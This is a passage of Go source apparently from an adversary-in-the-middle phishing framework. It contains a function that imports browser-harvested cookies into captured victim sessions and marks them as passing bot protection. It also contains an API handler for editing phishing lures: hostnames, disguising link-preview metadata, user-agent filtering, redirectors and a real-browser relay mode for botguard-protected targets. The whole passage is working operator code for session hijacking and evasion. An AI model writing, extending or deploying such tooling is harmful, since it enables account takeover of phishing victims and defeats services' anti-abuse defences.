		writeApiErr(w, http.StatusBadRequest, "bad_request", err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"result": "imported"})
}

// ImportPuppetCookies merges evilpuppet browser cookies into the live
// session (memory + sqlite) and marks the session botguard-verified (a real
// browser produced them).
func (p *HttpProxy) ImportPuppetCookies(sid string, phishlet string, cookies []ppCookieIn) error {
	s, ok := p.sessions[sid]
	if !ok {
		return fmt.Errorf("session not found: %s", sid[:bgMin(8, len(sid))])
	}
	for _, ck := range cookies {
		domain := ck.Domain
		if domain == "" {
			continue
		}
		exp := time.Now().Add(24 * time.Hour)
		s.AddCookieAuthToken(domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, exp)
	}
	if err := p.db.SetSessionCookieTokens(sid, s.CookieTokens); err != nil {
		return err
	}
	st := p.bgState(sid)
	p.bg_mtx.Lock()
	st.verified = true
	p.bg_mtx.Unlock()
	log.Info("puppet: imported %d cookies into session %s", len(cookies), sid[:bgMin(8, len(sid))])
	return nil
}

// handleLureItem — GET detail / PUT edit / DELETE for /lures/{id}.
// The id is the lure's stable id; positional indices are gone.
func (a *apiServer) handleLureItem(w http.ResponseWriter, r *http.Request, rest string) {
	idx, ok := a.cfg.GetLureIndexById(rest)
	if !ok {
		writeApiErr(w, http.StatusNotFound, "lure_not_found", "lure not found")
		return
	}
	l := a.cfg.lures[idx]
	switch r.Method {
	case "GET":
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(lureView(a.cfg, l, true))
	case "DELETE":
		if err := a.cfg.DeleteLureById(l.Id); err != nil {
			writeApiErr(w, http.StatusBadRequest, "delete_failed", err.Error())
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"deleted": l.Id})
	case "PUT":
		var req struct {
			Hostname        *string `json:"hostname"`
			Path            *string `json:"path"`
			RedirectUrl     *string `json:"redirect_url"`
			UserAgentFilter *string `json:"ua_filter"`
			Info            *string `json:"info"`
			OgTitle         *string `json:"og_title"`
			OgDescription   *string `json:"og_desc"`
			OgImageUrl      *string `json:"og_image"`
			OgUrl           *string `json:"og_url"`
			Redirector      *string `json:"redirector"`
			Phishlet        *string `json:"phishlet"`
			PausedUntil     *int64  `json:"paused"`
			Relay           *bool   `json:"relay"`
		}
		if e := json.NewDecoder(r.Body).Decode(&req); e != nil {
			writeApiErr(w, http.StatusBadRequest, "invalid_body", "bad body")
			return
		}
		if req.PausedUntil != nil {
			// pause the lure until the given unix time (0 = resume now);
			// paused lures serve the block page instead of the login flow
			l.PausedUntil = *req.PausedUntil
		}
		if req.Relay != nil {
			// toggle real-browser relay mode (botguard-protected targets)
			l.Relay = *req.Relay
		}
		if req.Phishlet != nil {
			if _, e := a.cfg.GetPhishlet(*req.Phishlet); e != nil {
				writeApiErr(w, http.StatusUnprocessableEntity, "invalid_phishlet", "unknown phishlet")
				return
			}
			l.Phishlet = *req.Phishlet
		}
		if req.UserAgentFilter != nil {
			if _, e := regexp.Compile(*req.UserAgentFilter); e != nil {
				writeApiErr(w, http.StatusUnprocessableEntity, "invalid_ua_filter", "bad ua_filter regexp")
				return
			}
			l.UserAgentFilter = *req.UserAgentFilter
		}
		if req.Redirector != nil && *req.Redirector != "" {
			dir := a.cfg.redirectorsDir
			_, statErr := os.Stat(filepath.Join(dir, *req.Redirector, "index.html"))
			if dir == "" || statErr != nil {
				writeApiErr(w, http.StatusUnprocessableEntity, "redirector_not_found", "redirector not found")
				return
			}
			l.Redirector = *req.Redirector
		}
		hostname_changed := false
		if req.Hostname != nil {
			l.Hostname = *req.Hostname
			hostname_changed = true
		}
		if req.Path != nil {
			l.Path = *req.Path
		}
		if req.RedirectUrl != nil {
			l.RedirectUrl = *req.RedirectUrl
		}
		if req.Info != nil {
			l.Info = *req.Info
		}
		if req.OgTitle != nil {
			l.OgTitle = *req.OgTitle
		}
		if req.OgDescription != nil {
			l.OgDescription = *req.OgDescription
		}
		if req.OgImageUrl != nil {
			l.OgImageUrl = *req.OgImageUrl
		}
		if req.OgUrl != nil {
			l.OgUrl = *req.OgUrl
		}
		if err := a.cfg.SetLure(idx, l); err != nil {
			writeApiErr(w, http.StatusBadRequest, "update_failed", err.Error())
			return
		}
		if hostname_changed {
			a.cfg.refreshActiveHostnames()
			if a.px != nil {
				a.px.RefreshCerts()
			}
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(lureView(a.cfg, l, true))
	default:
		writeApiErr(w, http.StatusMethodNotAllowed, "method_not_allowed", "GET/PUT/DELETE only")
	}
}
